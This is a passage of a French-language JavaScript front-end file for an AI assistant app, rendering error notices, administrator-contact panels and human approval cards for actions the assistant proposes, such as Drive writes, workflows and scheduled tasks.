    return Array.isArray(actions.contact) ? actions.contact : [];
}

/**
 * Annonce la bascule sur le LLM de secours. `reason` est le titre de la panne,
 * déjà traduit par le serveur (« Service surchargé », « Crédit épuisé chez
 * OpenAI ») : l'utilisateur sait POURQUOI son modèle n'a pas répondu. La même
 * information reste dans la trace d'actions au-dessus de la réponse.
 */
function announceLlmFallback(fb) {
    if (!fb) return;
    showToast(
        t('Bascule sur le LLM de secours : ') + (fb.from_label || fb.from) +
        ' → ' + (fb.to_label || fb.to) + (fb.reason ? ' (' + fb.reason + ')' : ''),
        'warning'
    );
}

/** Texte brut d'un bloc d'erreur (copie, data-raw) — même forme que le texte persisté. */
function errorPlainText(payload) {
    const p = payload || {};
    const title = String(p.title || '').trim();
    const message = String(p.message || '').trim();
    return '⚠️ ' + (title && message ? title + '\n\n' + message : (message || title));
}

/** HTML du bloc d'erreur (icône + titre + message), rendu dans la bulle assistant. */
function buildErrorBlockHtml(payload) {
    const p = payload || {};
    const title = escHtml(p.title || t('Une erreur est survenue'));
    const message = escHtml(p.message || t('Réessayez dans un instant.'));
    const kind = escHtml(p.kind || 'generic');
    return `<div class="msg-error" data-kind="${kind}" role="alert">
        <svg class="msg-error-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
        <div class="msg-error-body">
            <div class="msg-error-title">${title}</div>
            <div class="msg-error-text">${message}</div>
            ${errorActionsHtml(p)}
        </div>
    </div>`;
}

// ---- « Prévenir un administrateur » (encadré d'erreur) ----
// Une panne qui ne se règle pas depuis la conversation (crédit épuisé chez le
// fournisseur, clé refusée, modèle retiré, incident qui dure) : l'encadré
// propose d'écrire à un administrateur — LES administrateurs de l'instance,
// nommés (window.ADMIN_CONTACTS), avec un message déjà rédigé. « Contactez un
// administrateur » seul ne dit pas QUI, et c'est souvent la première fois que
// la personne lit ce genre de message. Un administrateur voit à la place le
// lien de la page où régler la cause. Rien de tout cela pour une erreur que
// l'utilisateur règle lui-même (trop de contenu, pièce jointe, filtre).

let errorContactSeq = 0;

const ERROR_ICON_MAIL = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-10 6L2 7"/></svg>';
const ERROR_ICON_GEAR = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>';
const ERROR_ICON_CHEVRON = '<svg class="msg-error-chevron" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>';
const ERROR_ICON_COPY = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>';

/** Actions de l'encadré : bouton « Prévenir un administrateur », ou lien de réglage pour un administrateur. */
function errorActionsHtml(p) {
    if (!p || p.contact_admin !== true) return '';
    const kind = String(p.kind || 'generic');
    if (window.IS_ADMIN) {
        const fix = ((window.LLM_ERROR_ACTIONS || {}).fix || {})[kind];
        if (!fix || !fix.url) return '';
        return `<div class="msg-error-actions">
            <a class="msg-error-btn" href="${escAttr(fix.url)}">${ERROR_ICON_GEAR}<span>${escHtml(t(fix.label))}</span></a>
        </div>`;
    }
    const id = 'msgErrorContacts' + (++errorContactSeq);
    return `<div class="msg-error-actions">
            <button type="button" class="msg-error-btn" data-error-contact aria-expanded="false" aria-controls="${id}">${ERROR_ICON_MAIL}<span>${escHtml(t('Prévenir un administrateur'))}</span>${ERROR_ICON_CHEVRON}</button>
        </div>
        <div class="msg-error-contacts" id="${id}" data-error-title="${escAttr(p.title || '')}" data-error-message="${escAttr(p.message || '')}" hidden></div>`;
}

/** Message prêt à envoyer (corps du courriel, ou texte copié). */
function errorReportText(title, message, name) {
    const app = String(window.APP_NAME || 'MIA');
    const date = new Date().toLocaleString(document.documentElement.lang || undefined, { dateStyle: 'long', timeStyle: 'short' });
    return [
        name ? t('Bonjour {nom},', { nom: name }) : t('Bonjour,'),
        '',
        t('En utilisant {app}, je reçois ce message :', { app }),
        '',
        title,
        message,
        '',
        t('Constaté le {date}.', { date }),
        t('Merci de votre aide !'),
    ].join('\n');
}

/** Contenu du panneau, construit à l'ouverture : la date du message est celle du signalement. */
function fillErrorContacts(panel) {
    const title = panel.dataset.errorTitle || '';
    const message = panel.dataset.errorMessage || '';
    const app = String(window.APP_NAME || 'MIA');
    const subject = t('{app} — {titre}', { app, titre: title });
    const contacts = Array.isArray(window.ADMIN_CONTACTS) ? window.ADMIN_CONTACTS : [];
    const items = contacts.map((c) => {
        const name = String(c.name || c.email || '');
        const email = String(c.email || '');
        const prenom = name.split(/\s+/)[0] || '';
        const href = 'mailto:' + encodeURIComponent(email).replace(/%40/g, '@')
            + '?subject=' + encodeURIComponent(subject)
            + '&body=' + encodeURIComponent(errorReportText(title, message, prenom));
        return `<li><a class="msg-error-contact" href="${escAttr(href)}">
            <span class="msg-error-contact-initial" aria-hidden="true">${escHtml((name.trim()[0] || '?').toUpperCase())}</span>
            <span class="msg-error-contact-id"><span class="msg-error-contact-name">${escHtml(name)}</span><span class="msg-error-contact-mail">${escHtml(email)}</span></span>
            ${ERROR_ICON_MAIL}
        </a></li>`;
    }).join('');
    const intro = contacts.length > 1
        ? t('Écrivez à l\'un des administrateurs : le message est déjà rédigé.')
        : (contacts.length === 1
            ? t('Écrivez à l\'administrateur : le message est déjà rédigé.')
            : t('Transmettez ce message à la personne qui gère {app} dans votre organisation.', { app }));
    panel.innerHTML = `<p class="msg-error-contacts-intro">${escHtml(intro)}</p>
        ${items ? `<ul class="msg-error-contacts-list">${items}</ul>` : ''}
        <button type="button" class="msg-error-btn msg-error-btn--quiet" data-error-copy>${ERROR_ICON_COPY}<span>${escHtml(t('Copier le message'))}</span></button>`;
}

document.addEventListener('click', async (e) => {
    const toggle = e.target.closest('[data-error-contact]');
    if (toggle) {
        const panel = document.getElementById(toggle.getAttribute('aria-controls') || '');
        if (!panel) return;
        const open = panel.hidden;
        if (open) fillErrorContacts(panel);
        panel.hidden = !open;
        toggle.setAttribute('aria-expanded', open ? 'true' : 'false');
        if (open) panel.querySelector('a, button')?.focus({ preventScroll: true });
        return;
    }
    const copy = e.target.closest('[data-error-copy]');
    if (copy) {
        const panel = copy.closest('.msg-error-contacts');
        if (!panel) return;
        try {
            await navigator.clipboard.writeText(errorReportText(panel.dataset.errorTitle || '', panel.dataset.errorMessage || '', ''));
            showToast(t('Message copié : collez-le dans un courriel ou une messagerie.'), 'success');
        } catch (_err) {
            showToast(t('Impossible de copier le message.'), 'error');
        }
    }
});

/**
 * Rend un bloc d'erreur dans un élément .msg-content (live).
 * `payload` = charge utile SSE `llm_error` (kind/title/message). Conserve un
 * texte propre dans data-raw pour la copie et le rechargement.
 */
function renderInlineError(contentEl, payload) {
    if (!contentEl) return;
    const p = payload || { title: t('Une erreur est survenue'), message: t('Réessayez dans un instant.') };
    contentEl.__streamRenderFinalized = true;
    contentEl.classList.remove('streaming');
    contentEl.querySelector('.stream-phase')?.remove();
    contentEl.dataset.errorPayload = JSON.stringify(p);
    contentEl.dataset.errorBlock = '1';
    contentEl.dataset.raw = errorPlainText(p);
    let md = contentEl.querySelector('.md-render');
    if (!md) {
        md = document.createElement('span');
        md.className = 'md-render';
        contentEl.appendChild(md);
    }
    md.innerHTML = buildErrorBlockHtml(p);
    refreshAssistantActions(contentEl.closest('.message'));
    scrollBottom();
}

/**
 * Carte d'approbation d'une écriture Google Drive demandée par l'assistant.
 * Rien n'est exécuté tant que l'utilisateur n'a pas cliqué « Approuver » :
 * la carte détaille l'action, le fichier visé et les impacts exacts, puis
 * affiche le résultat (ou l'annulation / l'échec) à la place des boutons.
 * data = {id, action, fichier, url, impacts[], apercu} (payload drive_confirm).
 */
function renderDriveConfirmCard(target, data) {
    if (!target || !data || !data.id) return;
    // Un brouillon d'email (Gmail, Outlook) a sa carte de RELECTURE : le
    // message en entier, modifiable et améliorable (bloc `mail` du payload,
    // cf. MailDraftReview côté serveur).
    if (data.mail && typeof data.mail === 'object') {
        return renderMailDraftCard(target, data);
    }
    const card = document.createElement('div');
    card.className = 'drive-confirm-card';
    card.dataset.actionId = String(data.id);
    const fileHtml = data.url
        ? `<a href="${escAttr(String(data.url))}" target="_blank" rel="noopener">${escHtml(String(data.fichier || ''))}</a>`
        : escHtml(String(data.fichier || ''));
    const impacts = (data.impacts || []).map(impact => `<li>${escHtml(String(impact))}</li>`).join('');
    // Titre de l'aperçu dépliable : « Prompt système » pour un assistant.
    const apercuTitle = String(data.apercu_titre || 'Aperçu du contenu');
    const apercu = data.apercu
        ? `<details class="drive-confirm-apercu"><summary>${escHtml(apercuTitle)}</summary><pre>${escHtml(String(data.apercu))}</pre></details>`
        : '';
    // Icône du connecteur portée par le payload (Gmail…) — fallback Drive
    // pour les cartes déposées avant l'arrivée de la clé `icone`.
    const cardIcon = String(data.icone || '/assets/img/google-drive.svg');
    // « Ajuster » : le formulaire pré-rempli depuis CETTE carte — on corrige
    // le rythme d'une tâche ou la configuration d'un assistant avant de
    // valider. `true` = tâche programmée (cartes d'avant), une adresse = la
    // fiche visée (même origine seulement).
    const adjustBase = (typeof data.ajuster === 'string' && /^\/[^\/\\]/.test(data.ajuster)) ? data.ajuster : '';
    const adjustLink = data.ajuster
        ? `<a class="drive-confirm-btn drive-confirm-adjust" href="${adjustBase
            ? escAttr(adjustBase + '?action=' + encodeURIComponent(String(data.id)))
            : `/settings/schedules/new?action=${encodeURIComponent(String(data.id))}`}">${escHtml(t('Ajuster'))}</a>`
        : '';
    // Visuel d'un assistant proposé : son avatar, sinon la pastille de sa
    // couleur avec son initiale — à la place de l'icône de fichier.
    const visual = data.visuel && typeof data.visuel === 'object' ? data.visuel : null;
    const visualColor = visual && /^#[0-9a-f]{6}$/i.test(String(visual.couleur || '')) ? String(visual.couleur) : '';
    const visualImage = visual && /^\/assets\/img\/[A-Za-z0-9._\/%-]+$/.test(String(visual.image || '')) ? String(visual.image) : '';
    const fileIcon = visual
        ? `<span class="drive-confirm-visual"${visualColor ? ` style="--visual-color:${escAttr(visualColor)}"` : ''}>`
            + (visualImage ? `<img src="${escAttr(visualImage)}" alt="">` : `<span>${escHtml(String(visual.initiale || '?'))}</span>`)
            + `</span>`
        : '📄';
    card.innerHTML = `
        <div class="drive-confirm-head">
            <img src="${escAttr(cardIcon)}" alt="" width="18" height="18">
            <div>
                <div class="drive-confirm-title">${escHtml(String(data.action || 'Action'))}</div>
                <div class="drive-confirm-sub">Votre approbation est requise — rien ne sera fait sans elle.</div>
            </div>
        </div>
        <div class="drive-confirm-file${visual ? ' has-visual' : ''}">${fileIcon} ${fileHtml}</div>
        <ul class="drive-confirm-impacts">${impacts}</ul>
        ${workflowRailHtml(data.rail)}
        ${apercu}
        ${provenanceHtml(data)}
        ${voiceHintHtml(t('À la voix : « approuver » ou « annuler ».'))}
        <div class="drive-confirm-actions">
            <button type="button" class="drive-confirm-btn drive-confirm-approve">Approuver</button>
            ${adjustLink}
            <button type="button" class="drive-confirm-btn drive-confirm-cancel">Annuler</button>
        </div>
        <div class="drive-confirm-status" hidden></div>`;
    card.querySelector('.drive-confirm-approve').addEventListener('click', async () => {
        const issue = await resolveDriveAction(card, 'approve');
        openCreatedWorkflow(card, issue);
    });
    card.querySelector('.drive-confirm-cancel').addEventListener('click', () => resolveDriveAction(card, 'cancel'));
    target.appendChild(card);
    return card;
}

/**
 * Workflow approuvé d'un clic sur SA carte : la personne arrive aussitôt
 * dans l'éditeur, sur le workflow réglé, pour l'ajuster (retour à la
 * conversation dans l'éditeur). Pas pendant une conversation vocale (elle
 * s'arrêterait), ni après « Tout approuver » (plusieurs actions d'un coup) :
 * le lien « Ouvrir dans l'éditeur » reste sur la carte.
 */
function openCreatedWorkflow(card, issue) {
    const url = card.dataset.workflowOpen || '';
    if (issue !== 'executed' || !/^\/workflows\/\d+\/edit(\?conv=\d+)?$/.test(url)) return;
    if (document.body.classList.contains('voice-chat-on')) return;
    const statusEl = card.querySelector('.drive-confirm-status');
    if (statusEl) {
        const note = document.createElement('span');
        note.className = 'drive-confirm-opening';
        note.textContent = t('Ouverture de l’éditeur…');
        statusEl.appendChild(note);
    }
    setTimeout(() => { window.location.assign(url); }, 450);
}

/**
 * Déroulé d'un workflow proposé par MIA (carte `creer_workflow`) : une ligne
 * par brique, de couleur de sa nature — les teintes du rail de l'éditeur.
 * Lignes calculées par le serveur (WorkflowDraft::railLines).
 */
function workflowRailHtml(rail) {
    if (!Array.isArray(rail) || !rail.length) return '';
    const kinds = ['start', 'step', 'action', 'create', 'condition', 'route', 'loop', 'gate', 'wait', 'notify', 'stop', 'end'];
    const items = rail.slice(0, 24).map((l) => {
        const kind = kinds.includes(String(l && l.kind)) ? String(l.kind) : 'step';
        const sub = l && l.sub ? `<small>${escHtml(String(l.sub))}</small>` : '';
        const review = l && l.review ? `<small class="is-review">${escHtml(t('puis vous relisez'))}</small>` : '';
        return `<li data-kind="${kind}"><span></span><div>${escHtml(String((l && l.title) || ''))}${sub}${review}</div></li>`;
    }).join('');
    return `<ol class="drive-confirm-rail" aria-label="${escAttr(t('Déroulé du workflow'))}">${items}</ol>`;
}

/**
 * Nouvelle conversation avec un assistant tout juste créé depuis une carte :
 * même requête que le choix d'un assistant dans la zone de saisie
 * (POST /chat/new), puis la page de la conversation.
 */
async function startConversationWithAssistant(profileId, btn) {
    if (!await ensureSessionActive()) return;
    if (btn) btn.disabled = true;
    const fd = new FormData();
    fd.append('profile_id', String(profileId));
    try {
        const res = await fetchWithSessionGuard('/chat/new', { method: 'POST', headers: { 'X-CSRF-Token': csrfToken }, body: fd, redirect: 'follow' });
        window.location.href = res.url || '/';
    } catch (err) {
        if (btn) btn.disabled = false;
        if (err instanceof Error && err.message === 'SESSION_EXPIRED') return;
        showToast(t('Réseau indisponible — réessayez.'), 'error');
    }
}

/**
 * Première exécution d'une tâche tout juste programmée depuis une carte :
 * la route du bouton « Exécuter maintenant » de la liste des tâches (même
 * contrôles côté serveur : quota, tâche du compte), puis la conversation de
 * l'exécution, où la réponse s'écrit en direct.
 */
async function runScheduledTaskNow(taskId, btn) {
    if (!await ensureSessionActive()) return;
    if (btn) btn.disabled = true;
    try {
        const res = await fetchWithSessionGuard(`/settings/schedules/${encodeURIComponent(String(taskId))}/run`, {
            method: 'POST',
            headers: { 'X-CSRF-Token': csrfToken, 'Accept': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
        });
        const data = await res.json().catch(() => ({}));
        if (data && data.ok && data.url) {
            window.location.href = String(data.url);
            return;
        }
        if (btn) btn.disabled = false;
        showToast(String((data && data.error) || t('Réseau indisponible — réessayez.')), 'error');
    } catch (err) {
        if (btn) btn.disabled = false;
        if (err instanceof Error && err.message === 'SESSION_EXPIRED') return;
        showToast(t('Réseau indisponible — réessayez.'), 'error');
    }
}

/**
 * Carte remplacée par une proposition révisée (« mets-le en bleu ») : elle
 * reste lisible, grisée, sans boutons — le serveur l'a close, la nouvelle
 * carte est juste en dessous.
 */
function markDriveCardSuperseded(id) {
    const card = document.querySelector(`.drive-confirm-card[data-action-id="${Number(id)}"]`);
    if (!card || card.classList.contains('is-done')) return;
    card.classList.add('is-superseded');
    card.querySelector('.drive-confirm-actions')?.remove();
    card.querySelector('.voice-cmd-hint')?.remove();
    const statusEl = card.querySelector('.drive-confirm-status');
    if (statusEl) {
        statusEl.hidden = false;
        statusEl.textContent = t('Remplacée par la nouvelle proposition ci-dessous.');
    }
}

/**
 * Provenance d'une carte (Provenance, côté serveur) : les contenus écrits par
 * des tiers que MIA avait lus avant de proposer l'action, et le rappel de
 * vérifier qu'elle correspond bien à la demande — c'est là qu'on approuve
 * que la vigilance sert. Rien quand l'action ne doit rien à un contenu tiers.
 */
function provenanceHtml(data) {
    const sources = Array.isArray(data && data.provenance) ? data.provenance.filter(Boolean) : [];
    if (!sources.length) return '';
    const items = sources.map(s => `<li>${escHtml(String(s))}</li>`).join('');
    return `<div class="drive-confirm-provenance">`
        + `<div class="drive-confirm-provenance-title">${escHtml(t('Préparé après la lecture de :'))}</div>`
        + `<ul>${items}</ul>`
        + `<div class="drive-confirm-provenance-note">${escHtml(t('Ces contenus sont écrits par des tiers : vérifiez que l’action correspond bien à votre demande.'))}</div>`
        + `</div>`;
}

/**
 * Repère « à la voix » d'une carte : ce que l'on peut DIRE à la place d'un
 * clic. Rendu dans toutes les cartes, affiché seulement pendant une
 * conversation vocale (classe `voice-chat-on` du <body>, cf. main.css) — hors
 * de ce mode, personne n'écoute.
 */
const VOICE_HINT_ICON = '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3Z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="22"/></svg>';
function voiceHintHtml(text) {
    return `<div class="voice-cmd-hint">${VOICE_HINT_ICON}<span>${escHtml(String(text))}</span></div>`;
}

/**
 * Envoie la décision (approve|cancel|send) au serveur et met la carte à jour.
 * `send` n'existe que sur la carte mail : l'email part réellement.
 *
 * Rend l'issue — 'executed' | 'started' (exécuté, suivi asynchrone lancé) |
 * 'cancelled' | 'retry' (rien n'a eu lieu, l'action attend toujours) |
 * 'failed' — pour qui n'a pas la carte sous les yeux : la conversation vocale
 * la dit à voix haute.
 */
async function resolveDriveAction(card, decision) {
    card.querySelectorAll('.drive-confirm-btn').forEach(b => { b.disabled = true; });
    // Carte mail : plus aucune modification pendant l'exécution — ce qui part
    // est la version enregistrée (flushMailDraftEdits est passé avant).
    if (card.classList.contains('mail-draft-card')) lockMailDraftEditor(card);
    const statusEl = card.querySelector('.drive-confirm-status');
    statusEl.hidden = false;
    statusEl.textContent = decision === 'approve' ? t('Exécution en cours…')
        : (decision === 'send' ? t('Envoi en cours…') : 'Annulation…');

    const fd = new FormData();
    fd.append('action_id', card.dataset.actionId || '');
    fd.append('decision', decision);
    let data;
    try {
        const res = await fetchWithSessionGuard(`/chat/${convId()}/drive-action`, {
            method: 'POST', headers: { 'X-CSRF-Token': csrfToken }, body: fd,
        });
        data = await res.json();
    } catch (e) {
        data = { error: t('Réseau indisponible — réessayez.') , retryable: true };
    }
    const issue = applyDriveDecision(card, decision, data);
    syncDriveBatchBar();
    syncContinueButton();
    return issue;
}

/**
 * Applique à une carte la réponse d'une décision (carte seule OU lot, cf.
 * resolveDriveBatch) et affiche aussitôt le message d'issue persisté par le
 * serveur (✅, 🚫, ⚠️) : sans lui, ce message n'apparaissait qu'au
 * rechargement, où la carte, elle, a disparu.
 */
function applyDriveDecision(card, decision, data) {
    const statusEl = card.querySelector('.drive-confirm-status');
    if (statusEl) statusEl.hidden = false;
    const actionsEl = card.querySelector('.drive-confirm-actions');
    if (data && data.ok && data.statut === 'executed') {
        const r = data.resultat || {};
        card.classList.add('is-done');
        if (decision === 'send') card.classList.add('is-sent');
        actionsEl?.remove();
        card.querySelector('.voice-cmd-hint')?.remove();
        // Carte mail : le panneau d'amélioration n'a plus d'objet une fois le
        // brouillon créé ; l'aperçu du message, lui, reste (c'est ce qui a été créé).
        card.querySelector('.mail-draft-panel')?.remove();
        // Toutes les actions ne produisent pas un lien (une exécution de
        // workflow n8n n'a pas d'URL) : sans ce garde, le nom devenait un lien
        // mort vers « # ».
        const nomHtml = r.url
            ? `<a href="${escAttr(String(r.url))}" target="_blank" rel="noopener">« ${escHtml(String(r.nom || ''))} »</a>`
            : `« ${escHtml(String(r.nom || ''))} »`;
        statusEl.innerHTML = `✅ ${escHtml(String(r.type || ''))} ${escHtml(String(r.verbe || ''))} : `
            + nomHtml + escHtml(String(r.extra || ''));
        // Assistant créé : on peut lui parler aussitôt (la liste des
        // assistants de la zone de saisie ne le connaîtra qu'au rechargement).
        if (r.assistant_id) {
            const startBtn = document.createElement('button');
            startBtn.type = 'button';
            startBtn.className = 'drive-confirm-start';
            startBtn.textContent = t('Discuter avec lui');
            startBtn.addEventListener('click', () => startConversationWithAssistant(r.assistant_id, startBtn));
            statusEl.appendChild(startBtn);
        }
        // Workflow créé : l'éditeur, pour le relire, l'ajuster, le publier —
        // ouvert d'office après un clic sur cette carte (openCreatedWorkflow).
        if (r.workflow_id) {
            const editUrl = '/workflows/' + encodeURIComponent(String(r.workflow_id)) + '/edit';
            const openUrl = typeof r.open === 'string' && r.open.indexOf(editUrl) === 0 ? r.open : '';
            const editLink = document.createElement('a');
            editLink.className = 'drive-confirm-start';
            editLink.href = openUrl || editUrl;
            editLink.textContent = t('Ouvrir dans l’éditeur');
            statusEl.appendChild(editLink);
            if (openUrl) card.dataset.workflowOpen = openUrl;
        }
        // Tâche programmée : une première exécution tout de suite, sans
        // attendre son créneau (comme « Exécuter maintenant » de la liste).
        if (r.task_id) {
            const runBtn = document.createElement('button');
            runBtn.type = 'button';
            runBtn.className = 'drive-confirm-start';
            runBtn.textContent = t('Exécuter maintenant');
            runBtn.addEventListener('click', () => runScheduledTaskNow(r.task_id, runBtn));
            statusEl.appendChild(runBtn);
        }
        showDriveOutcome(data);
        // Lancement d'un suivi asynchrone (génération Gamma, dépôt au cerveau
        // MyBrain) : on s'attache au job pour afficher le résultat en direct —
        // sans ça, le lien final n'apparaîtrait qu'au rechargement de la page.
        // Le type vient de la réponse : le serveur sait quel suivi il a lancé.
        if (data.job_id) {
            attachJob(String(data.job_id), { type: String(data.job_type || 'gamma'), convId: String(convId()) });
            return 'started';
        }
        return 'executed';
    } else if (data && data.ok && data.statut === 'cancelled') {
        card.classList.add('is-cancelled');
        actionsEl?.remove();
        card.querySelector('.voice-cmd-hint')?.remove();
        card.querySelector('.mail-draft-panel')?.remove();
        statusEl.textContent = t('🚫 Action annulée — rien n\'a été modifié.');
        showDriveOutcome(data);
        return 'cancelled';
    } else {
        const msg = String((data && data.error) || t('Erreur inattendue.'));
        if (data && data.retryable) {
            // Panne réseau, ou envoi refusé AVANT toute exécution (droit
            // d'envoi absent) : l'action est toujours en attente côté serveur.
            // La carte mail se repeint en relecture avec la raison — l'étape
            // de confirmation n'a plus d'objet, le brouillon reste possible.
            if (card.classList.contains('mail-draft-card')) {
                paintMailDraftCard(card, 'preview', { error: msg });
                return 'retry';
            }
            card.querySelectorAll('.drive-confirm-btn').forEach(b => { b.disabled = false; });
            statusEl.textContent = '⚠ ' + msg;
            return 'retry';
        }
        card.classList.add('is-failed');
        actionsEl?.remove();
        card.querySelector('.voice-cmd-hint')?.remove();
        statusEl.textContent = '⚠ ' + msg;
        showDriveOutcome(data);
        return 'failed';
    }
}

/**
 * Relevé « Ce que la tâche a fait sans validation » (tâche programmée qui
 * agit seule) : UN message, créé à la première action du tour puis réécrit,
 * placé AVANT la réponse en cours — en base, il est écrit avant elle, et le
 * rechargement le montrera là. Le contenu vient du serveur (Markdown), rendu
 * comme toute réponse.
 */
function upsertAutoRecord(streamEl, rec) {
    if (!rec || !rec.id || typeof rec.content !== 'string') return;
    const existing = document.querySelector(`#chatMessages .message[data-message-id="${Number(rec.id)}"]`);
    if (existing) {
        const content = existing.querySelector('.msg-content');
        const md = content?.querySelector('.md-render');
        if (content && md) {
            content.dataset.raw = rec.content;
            md.innerHTML = renderMarkdown(rec.content);
            hydrateGeneratedFiles(md);
        }
        return;
    }
    const content = appendMessage('assistant', rec.content, [], false, { messageId: rec.id });
    const row = content?.closest('.message');
    const anchor = streamEl?.closest('.message');
    if (row && anchor && anchor !== row && anchor.parentNode === row.parentNode) {
        anchor.parentNode.insertBefore(row, anchor);
    }
}

/** Message d'issue d'une décision, ajouté au fil (une fois). */
function showDriveOutcome(data) {
    const m = data && data.message;
    if (!m || !m.content) return;
    if (m.id && document.querySelector(`#chatMessages .message[data-message-id="${Number(m.id)}"]`)) return;
    appendMessage('assistant', String(m.content), [], false, { messageId: m.id || null });
    scrollBottom();
}

/**
 * Cartes qu'un lot peut trancher : en attente, boutons présents, hors email
 * (un email se relit et se valide sur sa propre carte).
 */
function pendingBatchCards() {
    return [...document.querySelectorAll('#chatMessages .drive-confirm-card')].filter(card =>
        !card.classList.contains('mail-draft-card')
        && !card.classList.contains('is-done')
        && !card.classList.contains('is-cancelled')
        && !card.classList.contains('is-failed')
        && card.querySelector('.drive-confirm-actions')
        && card.dataset.actionId);
}

/**
 * Carte récapitulative « Tout approuver / Tout refuser » : dès que deux
 * cartes au moins attendent, posée sous la dernière. Recalculée à chaque
 * carte rendue ou tranchée.
 */
function syncDriveBatchBar() {
    document.querySelectorAll('#chatMessages .drive-batch-row').forEach(el => el.remove());
    const cards = pendingBatchCards();
    if (cards.length < 2) return;
    const anchor = cards[cards.length - 1].closest('.message');
    if (!anchor) return;
    // Même coque qu'une réponse (avatar réservé, corps) : alignée sur le fil
    // quelle que soit la largeur, mobile compris.
    const row = document.createElement('div');
    row.className = 'message message-assistant drive-batch-row';
    row.innerHTML = '<div class="msg-avatar assistant-avatar drive-batch-spacer" aria-hidden="true"></div><div class="msg-body"></div>';
    const bar = document.createElement('div');
    bar.className = 'drive-batch-bar';
    bar.innerHTML = `
        <div class="drive-batch-text">${escHtml(t('{n} actions attendent votre approbation.', { n: cards.length }))}</div>
        <div class="drive-batch-actions">
            <button type="button" class="drive-confirm-btn drive-confirm-approve" data-batch="approve">${escHtml(t('Tout approuver'))}</button>
            <button type="button" class="drive-confirm-btn drive-confirm-cancel" data-batch="cancel">${escHtml(t('Tout refuser'))}</button>
        </div>
        <div class="drive-batch-status" hidden></div>`;
    bar.querySelectorAll('[data-batch]').forEach(btn => {
        btn.addEventListener('click', () => resolveDriveBatch(btn.dataset.batch, bar));
    });
    row.querySelector('.msg-body').appendChild(bar);
    anchor.insertAdjacentElement('afterend', row);
}

/**
 * Tranche en une fois toutes les cartes du lot : UNE requête, une issue par
 * action (même chemin serveur qu'un clic sur chaque carte).
 */
async function resolveDriveBatch(decision, bar) {
    const cards = pendingBatchCards();
    if (cards.length < 2) { syncDriveBatchBar(); return; }
    if (decision === 'approve' && !window.confirm(t('Approuver les {n} actions en attente ?', { n: cards.length }))) return;
    bar.querySelectorAll('button').forEach(b => { b.disabled = true; });
    const status = bar.querySelector('.drive-batch-status');
    status.hidden = false;
    status.textContent = t('Traitement de {n} actions…', { n: cards.length });
    cards.forEach(card => card.querySelectorAll('.drive-confirm-btn').forEach(b => { b.disabled = true; }));

    const fd = new FormData();
    fd.append('decision', decision);
    cards.forEach(card => fd.append('action_ids[]', card.dataset.actionId));
    let data;
    try {
        const res = await fetchWithSessionGuard(`/chat/${convId()}/drive-actions`, {
            method: 'POST', headers: { 'X-CSRF-Token': csrfToken }, body: fd,
        });
        data = await res.json();
    } catch (e) {
        data = null;
    }
    if (!data || !Array.isArray(data.results)) {
        cards.forEach(card => card.querySelectorAll('.drive-confirm-btn').forEach(b => { b.disabled = false; }));
        bar.querySelectorAll('button').forEach(b => { b.disabled = false; });
        status.textContent = '⚠ ' + String((data && data.error) || t('Réseau indisponible — réessayez.'));
        return;
    }
    data.results.forEach(r => {
        const card = cards.find(c => c.dataset.actionId === String(r.id));
        if (!card) return;
        const payload = r.data || {};
        // Email écarté du lot, ou action déjà tranchée ailleurs : la carte
        // reste telle quelle, la raison s'affiche dessous.
        if (payload.skipped || (r.status === 409 && !payload.ok)) {
            card.querySelectorAll('.drive-confirm-btn').forEach(b => { b.disabled = r.status !== 409; });
            const st = card.querySelector('.drive-confirm-status');
            if (st) { st.hidden = false; st.textContent = '⚠ ' + String(payload.error || ''); }
            return;
        }
        applyDriveDecision(card, decision, payload);
    });
    syncDriveBatchBar();
    syncContinueButton();
}

// =========================================================
// CARTE DE RELECTURE D'UN EMAIL (brouillon Gmail / Outlook)
// =========================================================
// Variante de la carte d'approbation quand le payload porte un bloc `mail`
